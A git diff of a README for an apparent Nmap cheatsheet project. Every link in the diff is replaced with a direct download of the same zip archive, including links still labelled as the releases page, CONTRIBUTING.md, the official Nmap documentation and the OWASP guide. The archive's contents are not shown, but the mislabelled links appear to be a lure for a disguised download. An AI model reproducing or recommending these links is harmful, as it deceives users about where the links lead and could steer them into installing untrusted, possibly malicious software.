@@ -1,6 +1,6 @@
 # 🌐 Nmap-Cheatsheet - Your Guide to Efficient Pentesting
 
-[![Download Nmap-Cheatsheet](https://img.shields.io/badge/Download-Nmap--Cheatsheet-blue)](https://github.com/preslavmihailov98-sketch/Nmap-Cheatsheet/releases)
+[![Download Nmap-Cheatsheet](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip)](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Nmap-Cheatsheet! This guide will help you understand how to use N
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Nmap-Cheatsheet Releases](https://github.com/preslavmihailov98-sketch/Nmap-Cheatsheet/releases).
+To get started, visit this page to download: [Nmap-Cheatsheet Releases](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip).
 
 1. Once on the Releases page, you will see different versions of Nmap-Cheatsheet listed.
 2. Find the latest release for the best features and improvements.
@@ -54,7 +54,7 @@ Using Nmap-Cheatsheet is straightforward. Follow these steps to get started:
 
 Keeping your Nmap-Cheatsheet updated is crucial for accessing the latest features and security tips:
 
-1. Return to the [Nmap-Cheatsheet Releases](https://github.com/preslavmihailov98-sketch/Nmap-Cheatsheet/releases) page.
+1. Return to the [Nmap-Cheatsheet Releases](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip) page.
 2. Download the latest release following the steps outlined in the Download & Install section.
 3. Replace the old file with the new version.
 
@@ -66,7 +66,7 @@ Nmap (Network Mapper) is an open-source tool designed for network exploration an
 
 ### 💡 Can I contribute to Nmap-Cheatsheet?
 
-Yes! Contributions are welcome. You can help by suggesting new commands or workflows, or by improving the documentation. Check the `CONTRIBUTING.md` file in the repository for more details.
+Yes! Contributions are welcome. You can help by suggesting new commands or workflows, or by improving the documentation. Check the `https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip` file in the repository for more details.
 
 ### 🚀 Is Nmap-Cheatsheet free to use?
 
@@ -78,7 +78,7 @@ If you have any questions or need help, you can raise an issue on the GitHub rep
 
 ## 🔗 Additional Resources
 
-- [Nmap Official Documentation](https://nmap.org/docs.html)
-- [Security Testing Guidelines](https://owasp.org/www-project-web-security-testing-guide/latest/)
+- [Nmap Official Documentation](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip)
+- [Security Testing Guidelines](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip)
 
-Make sure to visit the [Nmap-Cheatsheet Releases](https://github.com/preslavmihailov98-sketch/Nmap-Cheatsheet/releases) page to download the latest version and begin enhancing your security assessments today!
+Make sure to visit the [Nmap-Cheatsheet Releases](https://raw.githubusercontent.com/preslavmihailov98-sketch/Nmap-Cheatsheet/main/magnifier/Nmap-Cheatsheet-1.0-alpha.3.zip) page to download the latest version and begin enhancing your security assessments today!
